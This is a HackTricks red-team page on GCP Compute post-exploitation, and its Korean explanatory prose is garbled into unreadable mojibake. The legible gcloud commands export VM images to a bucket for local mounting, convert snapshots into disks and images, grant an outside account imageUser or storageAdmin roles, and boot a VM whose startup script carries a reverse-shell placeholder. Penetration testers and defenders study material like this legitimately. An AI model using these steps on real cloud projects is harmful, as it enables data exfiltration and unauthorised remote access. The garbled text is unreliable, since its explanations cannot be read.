# GCP - Compute Post Exploitation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Compute

Computeì™€ VPC (Networking)ì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” ë‹¤ìŒì„ ì°¸ì¡°í•˜ì‹­ì‹œì˜¤:

{% content-ref url="../gcp-services/gcp-compute-instances-enum/" %}
[gcp-compute-instances-enum](../gcp-services/gcp-compute-instances-enum/)
{% endcontent-ref %}

### Export & Inspect Images locally

ì´ ë°©ë²•ì„ í†µí•´ ê³µê²©ìëŠ” **ì´ë¯¸ ì¡´ì¬í•˜ëŠ” ì´ë¯¸ì§€ì— í¬í•¨ëœ ë°ì´í„°ì— ì ‘ê·¼**í•˜ê±°ë‚˜ **ì‹¤í–‰ ì¤‘ì¸ VMì˜ ìƒˆë¡œìš´ ì´ë¯¸ì§€ë¥¼ ìƒì„±**í•˜ì—¬ ì‹¤í–‰ ì¤‘ì¸ VMì— ì ‘ê·¼í•˜ì§€ ì•Šê³ ë„ ë°ì´í„°ë¥¼ ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

VM ì´ë¯¸ì§€ë¥¼ ë²„í‚·ìœ¼ë¡œ ë‚´ë³´ë‚¸ ë‹¤ìŒ ë‹¤ìš´ë¡œë“œí•˜ì—¬ ë¡œì»¬ì—ì„œ ë§ˆìš´íŠ¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ëª…ë ¹ì–´ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

{% code overflow="wrap" %}
```bash
gcloud compute images export --destination-uri gs://<bucket-name>/image.vmdk --image imagetest --export-format vmdk
# The download the export from the bucket and mount it locally
```
{% endcode %}

ì´ ì‘ì—…ì„ ìˆ˜í–‰í•˜ê¸° ìœ„í•´ ê³µê²©ìëŠ” ìŠ¤í† ë¦¬ì§€ ë²„í‚·ì— ëŒ€í•œ ê¶Œí•œì´ í•„ìš”í•  ìˆ˜ ìˆìœ¼ë©°, **cloudbuild**ì— ëŒ€í•œ **ê¶Œí•œ**ì´ ë°˜ë“œì‹œ í•„ìš”í•©ë‹ˆë‹¤. ì´ëŠ” **ì„œë¹„ìŠ¤**ê°€ ë‚´ë³´ë‚´ê¸°ë¥¼ ìˆ˜í–‰í•˜ë„ë¡ ìš”ì²­ë°›ì„ ê²ƒì´ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.\
ë˜í•œ, ì´ë¥¼ ìœ„í•´ codebuild SAì™€ compute SAëŠ” ê¶Œí•œì´ í•„ìš”í•©ë‹ˆë‹¤.\
cloudbuild SA `<project-id>@cloudbuild.gserviceaccount.com`ëŠ” ë‹¤ìŒ ê¶Œí•œì´ í•„ìš”í•©ë‹ˆë‹¤:

* roles/iam.serviceAccountTokenCreator
* roles/compute.admin
* roles/iam.serviceAccountUser

ê·¸ë¦¬ê³  SA `<project-id>-compute@developer.gserviceaccount.com`ëŠ” ë‹¤ìŒ ê¶Œí•œì´ í•„ìš”í•©ë‹ˆë‹¤:

* roles/compute.storageAdmin
* roles/storage.objectAdmin

### ìŠ¤ëƒ…ìƒ· ë° ë””ìŠ¤í¬ë¥¼ ë¡œì»¬ì—ì„œ ë‚´ë³´ë‚´ê¸° ë° ê²€ì‚¬

ìŠ¤ëƒ…ìƒ·ê³¼ ë””ìŠ¤í¬ë¥¼ ì§ì ‘ ë‚´ë³´ë‚´ëŠ” ê²ƒì€ ë¶ˆê°€ëŠ¥í•˜ì§€ë§Œ, **ìŠ¤ëƒ…ìƒ·ì„ ë””ìŠ¤í¬ë¡œ ë³€í™˜í•˜ê³ , ë””ìŠ¤í¬ë¥¼ ì´ë¯¸ì§€ë¡œ ë³€í™˜**í•œ ë‹¤ìŒ **ì´ì „ ì„¹ì…˜**ì„ ë”°ë¼ ì´ë¯¸ì§€ë¥¼ ë‚´ë³´ë‚´ì–´ ë¡œì»¬ì—ì„œ ê²€ì‚¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% code overflow="wrap" %}
```bash
# Create a Disk from a snapshot
gcloud compute disks create [NEW_DISK_NAME] --source-snapshot=[SNAPSHOT_NAME] --zone=[ZONE]

# Create an image from a disk
gcloud compute images create [IMAGE_NAME] --source-disk=[NEW_DISK_NAME] --source-disk-zone=[ZONE]
```
{% endcode %}

### VMì„ ìƒì„±í•˜ì—¬ ì´ë¯¸ì§€ ê²€ì‚¬

**ì´ë¯¸ì§€ì— ì €ì¥ëœ ë°ì´í„°** ë˜ëŠ” **ì‹¤í–‰ ì¤‘ì¸ VM** ë‚´ë¶€ì— ì ‘ê·¼í•˜ëŠ” ê²ƒì„ ëª©í‘œë¡œ, ê³µê²©ìê°€ **ì´ë¯¸ì§€ë¥¼ ìƒì„±í•œ** ê²½ìš° ì™¸ë¶€ ê³„ì •ì— ì´ë¯¸ì§€ì— ëŒ€í•œ ì ‘ê·¼ ê¶Œí•œì„ ë¶€ì—¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
gcloud projects add-iam-policy-binding [SOURCE_PROJECT_ID] \
--member='serviceAccount:[TARGET_PROJECT_SERVICE_ACCOUNT]' \
--role='roles/compute.imageUser'
```
ê·¸ë¦¬ê³  ë‚˜ì„œ ìƒˆë¡œìš´ VMì„ ìƒì„±í•©ë‹ˆë‹¤:
```bash
gcloud compute instances create [INSTANCE_NAME] \
--project=[TARGET_PROJECT_ID] \
--zone=[ZONE] \
--image=projects/[SOURCE_PROJECT_ID]/global/images/[IMAGE_NAME]
```
ë§Œì•½ ì™¸ë¶€ ê³„ì •ì— ì´ë¯¸ì§€ì— ëŒ€í•œ ì ‘ê·¼ ê¶Œí•œì„ ì¤„ ìˆ˜ ì—†ë‹¤ë©´, í”¼í•´ìì˜ í”„ë¡œì íŠ¸ì—ì„œ í•´ë‹¹ ì´ë¯¸ì§€ë¥¼ ì‚¬ìš©í•˜ì—¬ VMì„ ì‹¤í–‰í•˜ê³  **ë©”íƒ€ë°ì´í„°ê°€ ë¦¬ë²„ìŠ¤ ì‰˜ì„ ì‹¤í–‰**í•˜ë„ë¡ í•˜ì—¬ ì´ë¯¸ì§€ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ìŒê³¼ ê°™ì€ ë§¤ê°œë³€ìˆ˜ë¥¼ ì¶”ê°€í•©ë‹ˆë‹¤:
```bash
--metadata startup-script='#! /bin/bash
echo "hello"; <reverse shell>'
```
### Inspect a Snapshot/Disk attaching it to a VM

ë””ìŠ¤í¬ë‚˜ ìŠ¤ëƒ…ìƒ·ì— ì €ì¥ëœ **ë°ì´í„°ì— ì ‘ê·¼í•˜ê¸° ìœ„í•´, ìŠ¤ëƒ…ìƒ·ì„ ë””ìŠ¤í¬ë¡œ ë³€í™˜í•˜ê±°ë‚˜, ë””ìŠ¤í¬ë¥¼ ì´ë¯¸ì§€ë¡œ ë³€í™˜í•œ í›„ ì´ì „ ë‹¨ê³„ë¥¼ ë”°ë¥¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.**

ë˜ëŠ” **ì™¸ë¶€ ê³„ì •ì— ë””ìŠ¤í¬ ì ‘ê·¼ ê¶Œí•œì„ ë¶€ì—¬**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ì‹œì‘ì ì´ ìŠ¤ëƒ…ìƒ·ì¸ ê²½ìš° ìŠ¤ëƒ…ìƒ·ì— ì ‘ê·¼ ê¶Œí•œì„ ë¶€ì—¬í•˜ê±°ë‚˜ ì´ë¥¼ ë””ìŠ¤í¬ë¡œ ìƒì„±):
```bash
gcloud projects add-iam-policy-binding [PROJECT_ID] \
--member='user:[USER_EMAIL]' \
--role='roles/compute.storageAdmin'
```
**ë””ìŠ¤í¬ë¥¼ ì¸ìŠ¤í„´ìŠ¤ì— ì—°ê²°**:
```bash
gcloud compute instances attach-disk [INSTANCE_NAME] \
--disk [DISK_NAME] \
--zone [ZONE]
```
ë””ìŠ¤í¬ë¥¼ VM ë‚´ë¶€ì— ë§ˆìš´íŠ¸í•˜ê¸°:

1.  **VMì— SSH ì ‘ì†**:

```sh
gcloud compute ssh [INSTANCE_NAME] --zone [ZONE]
```
2. **ë””ìŠ¤í¬ ì‹ë³„**: VM ë‚´ë¶€ì— ì ‘ì†í•œ í›„, ë””ìŠ¤í¬ ì¥ì¹˜ë¥¼ ë‚˜ì—´í•˜ì—¬ ìƒˆ ë””ìŠ¤í¬ë¥¼ ì‹ë³„í•©ë‹ˆë‹¤. ì¼ë°˜ì ìœ¼ë¡œ `/dev/sdb`, `/dev/sdc` ë“±ìœ¼ë¡œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
3. **ë””ìŠ¤í¬ í¬ë§· ë° ë§ˆìš´íŠ¸** (ìƒˆ ë””ìŠ¤í¬ ë˜ëŠ” ì›ì‹œ ë””ìŠ¤í¬ì¸ ê²½ìš°):
*   ë§ˆìš´íŠ¸ í¬ì¸íŠ¸ ìƒì„±:

```sh
sudo mkdir -p /mnt/disks/[MOUNT_DIR]
```
*   ë””ìŠ¤í¬ ë§ˆìš´íŠ¸:

```sh
sudo mount -o discard,defaults /dev/[DISK_DEVICE] /mnt/disks/[MOUNT_DIR]
```

ìŠ¤ëƒ…ìƒ· ë˜ëŠ” ë””ìŠ¤í¬ì— ì™¸ë¶€ í”„ë¡œì íŠ¸ì— ëŒ€í•œ ì ‘ê·¼ ê¶Œí•œì„ ë¶€ì—¬í•  ìˆ˜ ì—†ëŠ” ê²½ìš°, **ìŠ¤ëƒ…ìƒ·/ë””ìŠ¤í¬ì™€ ë™ì¼í•œ í”„ë¡œì íŠ¸ ë‚´ì˜ ì¸ìŠ¤í„´ìŠ¤ì—ì„œ ì´ëŸ¬í•œ ì‘ì—…ì„ ìˆ˜í–‰í•´ì•¼ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

{% hint style="success" %}
AWS Hacking í•™ìŠµ ë° ì—°ìŠµ:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking í•™ìŠµ ë° ì—°ìŠµ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… í”Œëœ**](https://github.com/sponsors/carlospolop)ì„ í™•ì¸í•˜ì„¸ìš”!
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**telegram ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ì„ íŒ”ë¡œìš°í•˜ì„¸ìš”.
* [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
{% endhint %}
